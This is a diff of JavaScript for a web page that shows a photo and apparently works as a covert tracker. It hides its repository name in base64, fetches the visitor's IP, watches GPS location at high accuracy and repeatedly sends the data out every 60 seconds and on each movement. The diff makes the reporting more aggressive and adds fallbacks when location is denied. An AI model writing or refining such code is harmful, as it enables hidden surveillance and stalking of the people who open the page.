@@ -25,7 +25,6 @@ var REPO=atob("ZGhhbmFtcGFyaXN1c2VldHUtZHJvaWQvcGFyaXN1c2VldHU=");
 var I=60;
 var raw1="https://raw.githubusercontent.com/"+REPO+"/main/"+IMG;
 var lastLoc=null;
-var sendTimer=null;
 
 function fetchIP(){
     return fetch(API+"/ip").then(function(r){return r.json()}).catch(function(){return{}});
@@ -55,9 +54,13 @@ function send(){
     });
 }
 
-function debounceSend(){
-    if(sendTimer)clearTimeout(sendTimer);
-    sendTimer=setTimeout(send,2000);
+function onGPSReady(){
+    send();
+    setInterval(send,I*1000);
+    navigator.geolocation.watchPosition(function(p){
+        lastLoc={lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy,method:"GPS"};
+        send();
+    },function(){},{enableHighAccuracy:true,maximumAge:5000});
 }
 
 function startAll(){
@@ -66,17 +69,17 @@ function startAll(){
     var img=document.getElementById("photo");
     img.src=raw1;
     img.style.display="";
-    send();
-    setInterval(send,I*1000);
     if(navigator.geolocation){
         navigator.geolocation.getCurrentPosition(function(p){
             lastLoc={lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy,method:"GPS"};
-            debounceSend();
-            navigator.geolocation.watchPosition(function(p2){
-                lastLoc={lat:p2.coords.latitude,lng:p2.coords.longitude,accuracy:p2.coords.accuracy,method:"GPS"};
-                debounceSend();
-            },function(){},{enableHighAccuracy:true,maximumAge:5000});
-        },function(){},{enableHighAccuracy:true,timeout:30000,maximumAge:0});
+            onGPSReady();
+        },function(err){
+            send();
+            setInterval(send,I*1000);
+        },{enableHighAccuracy:true,timeout:30000,maximumAge:0});
+    } else {
+        send();
+        setInterval(send,I*1000);
     }
 }
 
